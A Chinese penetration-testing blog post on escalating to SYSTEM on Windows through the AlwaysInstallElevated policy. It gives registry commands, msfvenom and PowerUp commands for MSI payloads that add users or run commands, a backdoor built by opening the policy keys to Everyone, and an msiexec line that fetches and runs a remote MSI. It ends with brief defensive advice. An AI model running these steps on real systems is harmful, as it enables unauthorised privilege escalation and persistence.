---
layout: post
title: 利用AlwaysInstallElevated提权的测试分析
---


## 0x00 前言
---

利用AlwaysInstallElevated提权是一个2017年公开的技术，Metasploit和PowerUp都提供了利用方法

我在研究的过程中，发现Metasploit的利用方法存在一些不足，我遇到了和其他公开文章描述不一样的情况

于是我做了进一步的研究，本文将要介绍我遇到的问题和解决方法

## 0x01 简介
---

本文将要介绍以下内容：

- 常规利用方法
- 我在测试中遇到的问题
- 解决方法
- 扩展利用思路

## 0x02 常规利用方法
---

AlwaysInstallElevated是一个组策略配置，如果启用，那么将允许普通用户以SYSTEM权限运行安装文件(msi)

### 启用方法：

需要修改以下两个组策略：

- Computer Configuration\Administrative Templates\Windows Components\Windows Installer
- User Configuration\Administrative Templates\Windows Components\Windows Installer

设置成Enabled，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-1.png)

**注：**

无法通过secedit.exe在命令行下修改以上两个组策略

### 命令行下的启用方法：

创建以下两个注册表项：

- HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer,AlwaysInstallElevated,1
- HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer,AlwaysInstallElevated,1

cmd的命令如下：

```
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
```

### 利用方法：

启用AlwaysInstallElevated后，可以通过命令行调用msiexec安装msi文件，msi文件内包含要执行的Payload，Payload将会以System权限执行

调用msiexec的命令如下：

```
msiexec /q /i test.msi
```

/i参数用来表示安装操作

/q参数用来隐藏安装界面

**注：**

执行后会在%TEMP%下生成MSI的log文件

更多关于msiexec的介绍可参考之前的文章[《渗透测试中的msiexec》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec/)

## 0x03 开源方法测试
---

在测试环境启用AlwaysInstallElevated，命令如下：

```
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
```

### 1.PowerUp

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

(1)测试是否启用AlwaysInstallElevated

```
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```

返回True代表开启


(2)导出msi文件

```
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

当前目录生成UserAdd.msi

(3)命令行执行(当前用户权限)

```
msiexec /q /i UserAdd.msi
```

弹出添加用户的对话框，能够用来添加用户，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-2.png)

此时查看该对话框的权限为System，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-3.png)

提权成功

### 2.Metasploit

生成弹出计算器的msi文件，命令如下：

```
msfvenom -p windows/exec CMD=calc.exe -f msi >calc.msi
```

命令行执行msi文件(当前用户权限)：

```
msiexec /q /i calc.msi
```

弹出的计算器权限为Medium，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-4.png)

这与PowerUp的结果不同

换成其他Payload的msi文件，例如添加用户：

```
msfvenom -p windows/adduser USER=test PASS=12356QW!@ -f msi >adduser.msi
```

例如执行cmd命令：

```
msfvenom -p windows/x64/exec CMD='whoami >1.txt' -f msi > cmd.msi
```

由于权限不够(为Medium)，均失败

这与其他公开文章介绍的情况不一样

个人猜测：

使用Metasploit生成的msi文件在运行时没有要求提升权限，所以导致了这个问题

## 0x04 解决方法
---

这里可以参考PowerUp的方式生成msi文件

直接执行PowerUp生成的UserAdd.msi，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-1.png)

提示msi文件是由MSI Wrapper生成

下面我们就尝试使用MSI Wrapper生成一个可用的Payload

下载地址：

https://www.exemsi.com/download/

生成过程如下：

#### 1.将Payload设置为执行ProcessHacker

配置如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-2.png)

#### 2.运行时要求提升权限

配置如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-3.png)

**注：**

MSI installation context下选择Per User和Per Machine都可以

其他配置按照默认设置，生成的msi文件已上传至github，地址如下：

https://github.com/3gstudent/test/blob/master/RunProcessHacker.msi

再次测试，命令行执行msi文件(当前用户权限)：

```
msiexec /q /i RunProcessHacker.msi
```

ProcessHacker以System权限执行，利用成功，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-4.png)

综合以上的测试，我们可以得出结论：

使用Metasploit生成的msi文件在运行时没有要求提升权限，所以无法利用AlwaysInstallElevated提权

我们可以使用MSI Wrapper生成可供利用的msi文件

## 0x05 扩展利用思路
---

通常情况下，先对注册表项进行判断，如果满足条件(存在两个注册表项)，就可以利用AlwaysInstallElevated提权

### 扩展思路1：

如果获得了Backup service用户的权限，输入`whoami /priv`后，发现存在以下权限：

- SeRestorePrivilege
- SeTakeOwnershipPrivilege

此时能够对注册表进行写操作，可以创建对应的注册表项，再利用AlwaysInstallElevated提权

利用SeRestorePrivilege和SeTakeOwnershipPrivilege写注册表可参考之前的文章:[《渗透技巧——Windows Token九种权限的利用》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/)

### 扩展思路2：

如果已获得系统权限，可以创建一个提权后门

对以下注册表项添加ACL，允许Everyone进行写操作：

- HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
- HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

对注册表项添加ACL的方法可参考之前的文章：[《渗透技巧——Windows下的Access Control List》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/)

### 扩展思路3：

msiexec支持远程下载执行，那么能否利用AlwaysInstallElevated提权？

测试命令如下：

```
msiexec /q /i https://raw.githubusercontent.com/3gstudent/test/master/RunProcessHacker.msi
```

执行失败

下面查找原因，显示安装过程，测试命令如下：

```
msiexec /i https://raw.githubusercontent.com/3gstudent/test/master/RunProcessHacker.msi
```

提示来源不可信，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/4-1.png)

得出结论：

msi文件需要可信的证书才能远程利用AlwaysInstallElevated提权

## 0x06 防御建议
---

如果没有特殊需求，禁用AlwaysInstallElevated

监控注册表项：

- HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
- HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

## 0x07 小结
---

本文介绍了利用AlwaysInstallElevated提权的方法，找到了使用Metasploit生成的msi文件利用失败的原因，最后介绍了如何通过MSI Wrapper生成可供利用的msi文件


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





